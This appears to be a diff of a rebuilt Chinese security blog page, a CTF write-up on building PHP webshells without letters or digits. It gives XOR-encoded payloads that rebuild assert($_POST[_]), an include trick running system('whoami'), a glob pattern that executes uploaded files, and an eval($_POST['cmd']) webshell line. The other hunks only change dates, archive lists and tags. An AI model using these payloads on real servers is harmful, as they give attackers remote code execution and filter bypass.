@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://hackerqwq.github.io/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/6.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211106004905301.png">
 <meta property="article:published_time" content="2020-12-19T08:20:55.000Z">
-<meta property="article:modified_time" content="2021-11-08T01:34:30.433Z">
+<meta property="article:modified_time" content="2023-01-31T06:39:47.356Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="无参数构造payload">
@@ -442,7 +442,7 @@ height:50vh;
 <p>得到下面列表</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%81^%FF&#x3D;&gt;~     %82^%FF&#x3D;&gt;&#125;       %83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;     %85^%FF&#x3D;&gt;z       %86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x     %88^%FF&#x3D;&gt;w       %89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u     %8B^%FF&#x3D;&gt;t       %8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r     %8E^%FF&#x3D;&gt;q       %8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o     %91^%FF&#x3D;&gt;n       %92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l     %94^%FF&#x3D;&gt;k       %95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i     %97^%FF&#x3D;&gt;h       %98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f     %9A^%FF&#x3D;&gt;e       %9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c     %9D^%FF&#x3D;&gt;b       %9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;     %A0^%FF&#x3D;&gt;_       %A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]     %A3^%FF&#x3D;&gt;\       %A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z     %A6^%FF&#x3D;&gt;Y       %A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W     %A9^%FF&#x3D;&gt;V       %AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T     %AC^%FF&#x3D;&gt;S       %AD^%FF&#x3D;&gt;R    </span><br><span class="line">%AE^%FF&#x3D;&gt;Q     %AF^%FF&#x3D;&gt;P       %B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N     %B2^%FF&#x3D;&gt;M       %B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K     %B5^%FF&#x3D;&gt;J       %B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H     %B8^%FF&#x3D;&gt;G       %B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E     %BB^%FF&#x3D;&gt;D       %BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B     %BE^%FF&#x3D;&gt;A       %BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br></pre></td></tr></table></figure>
 <p>然后用这些字符构成函数，比如</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span>E^%FF=&gt;a</span><br><span class="line"> %<span class="number">8</span>C^%FF=&gt;s</span><br><span class="line"> %<span class="number">9</span>A^%FF=&gt;e</span><br><span class="line"> %<span class="number">8</span>D^%FF=&gt;r</span><br><span class="line"> %<span class="number">8</span>B^%FF=&gt;t</span><br><span class="line"> </span><br><span class="line">  %A0^%FF=&gt;_    </span><br><span class="line"> %AF^%FF=&gt;P </span><br><span class="line"> %B0^%FF=&gt;O</span><br><span class="line"> %AC^%FF=&gt;S</span><br><span class="line"> %AB^%FF=&gt;T </span><br><span class="line">    </span><br><span class="line">$_=<span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$__=<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br><span class="line"><span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span>E^%FF=&gt;a</span><br><span class="line"> %<span class="number">8</span>C^%FF=&gt;s</span><br><span class="line"> %<span class="number">9</span>A^%FF=&gt;e</span><br><span class="line"> %<span class="number">8</span>D^%FF=&gt;r</span><br><span class="line"> %<span class="number">8</span>B^%FF=&gt;t</span><br><span class="line"> </span><br><span class="line">  %A0^%FF=&gt;_    </span><br><span class="line"> %AF^%FF=&gt;P </span><br><span class="line"> %B0^%FF=&gt;O</span><br><span class="line"> %AC^%FF=&gt;S</span><br><span class="line"> %AB^%FF=&gt;T </span><br><span class="line">    </span><br><span class="line">$_=urldecode(<span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span>)^urldecode(<span class="string">&quot;%FF%FF%FF%FF%FF%FF&quot;</span>);</span><br><span class="line">$__=urldecode(<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>)^urldecode(<span class="string">&quot;%FF%FF%FF%FF%FF&quot;</span>);</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br><span class="line"><span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure>
 <p>这里之所以不直接传入<code>$_POST[_]</code>形成<code>eval($_POST[_])</code>是由于前面还存在异或的操作，而eval只会执行一次，所以得加一个<code>assert</code>函数<br><del>偷来的偷来的</del>,会在结尾标注<br>或者其他用法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br><span class="line">我们知道，经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符。 %A0^%FF=&gt;_ </span><br><span class="line">%B8^%FF=&gt;G</span><br><span class="line">%BA^%FF=&gt;E  </span><br><span class="line">%AB^%FF=&gt;T </span><br></pre></td></tr></table></figure>
 <p>解析：<br><code>%ff%ff%ff%ff^%a0%b8%ba%ab</code>,中一一对应进行异或，php中<code>&#123;&#125;</code>用来区别是字符串还是别的东西，防止混淆，这里用<code>&#123;&#125;</code>将<code>_GET</code>和<code>%ff</code>框起来就是防止被url解码了,最后执行了<code>phpinfo()</code></p>
@@ -471,7 +471,7 @@ height:50vh;
 </ol>
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211108093407868.png" alt="image-20211108093407868"></p>
 <ol start="3">
-<li>glob通配符<br><img src="/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/6.png"><br>那么就可以构造<code>\</code>. /???/???????[@-[]``来执行系统命令搜索我们上传的文件并执行<br>文件上传的html代码:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ip:*****/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<li>glob通配符<br> <img src="/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/6.png"><br> 那么就可以构造<code>\</code>. /???/???????[@-[]``来执行系统命令搜索我们上传的文件并执行<br> 文件上传的html代码:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ip:*****/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 可以将输出内容写到<code>/var/www/html/abc/</code>目录下直接查看<br>可以<code>echo &quot;&lt;?php eval($_POST[&#39;cmd&#39;])&quot;</code>直接用蚁剑连上去</li>
 </ol>
 <h1 id="查看可用字符的脚本"><a href="#查看可用字符的脚本" class="headerlink" title="查看可用字符的脚本"></a>查看可用字符的脚本</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, chr($ascii))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (chr($ascii));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -489,8 +489,6 @@ height:50vh;
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211106004905301.png" alt="image-20211106004905301"></p>
 <h1 id="小trick记录"><a href="#小trick记录" class="headerlink" title="小trick记录"></a>小trick记录</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">或使用[~(取反)][!%FF]的形式，</span></span><br><span class="line"><span class="comment">即: $str = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;;    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$str = &quot;?&gt;&lt;?=include $_GET[_]?&gt;&quot;; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">?cmd=<span class="keyword">include</span>$_GET[_]<span class="meta">?&gt;</span>&amp;_=<span class="meta">&lt;?php</span> system(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-
-
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mxwoodKUiXdbOSgPUkKaWg">https://mp.weixin.qq.com/s/mxwoodKUiXdbOSgPUkKaWg</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html?page=1#reply-list">https://www.leavesongs.com/penetration/webshell-without-alphanum.html?page=1#reply-list</a></p>
 
     </article>
@@ -500,7 +498,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/">https://hackerqwq.github.io/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/">December 19th 2020, 4:20:55 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/">November 8th 2021, 9:34:30 am</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/">January 31st 2023, 2:39:47 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -3301,9 +3299,161 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 155
+        Total : 163
         </div>
         <!-- search  -->
         
@@ -3318,8 +3468,57 @@ top:50vh;
     
     
     
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/" >Despercate Cat 带来的Tomcat利用思路</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2022 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href= "/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/" >利用链神器-tabby使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2022/10/01/neo4j%E5%9B%BE%E5%BD%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0/" >neo4j图形数据库笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2022/09/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >PHP反序列化利用面总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2022/09/22/Webshell%E5%85%8D%E6%9D%80%E4%B9%8Bphp/" >Webshell免杀之php(WebShell免杀篇一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2022/09/21/source-map%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/" >source map源码泄露利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2022/09/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%88%A9%E7%94%A8%E9%9D%A2/" >中间件利用面</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2022/08/31/java%E5%9F%BA%E7%A1%80%E4%B9%8Bjndi/" >java基础之jndi</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4031,7 +4230,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露payload</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露</a>
         </li>
     
     
@@ -4127,8 +4326,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
@@ -4155,31 +4352,37 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
+    
         <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
+        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
         <span class="sidebar-tag-name" data-tags="权限提升"><span class="iconfont-archer">&#xe606;</span>权限提升</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
-    
-        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
-    
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="红蓝对抗"><span class="iconfont-archer">&#xe606;</span>红蓝对抗</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="2021Nep"><span class="iconfont-archer">&#xe606;</span>2021Nep</span>
     
@@ -4197,27 +4400,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
-    
-        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
-    
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
-        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
-    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="免杀"><span class="iconfont-archer">&#xe606;</span>免杀</span>
+    
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
@@ -4309,9 +4510,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
-    
         <span class="sidebar-tag-name" data-tags="url取反绕过"><span class="iconfont-archer">&#xe606;</span>url取反绕过</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
     
         <span class="sidebar-tag-name" data-tags="create_function注入"><span class="iconfont-archer">&#xe606;</span>create_function注入</span>
     
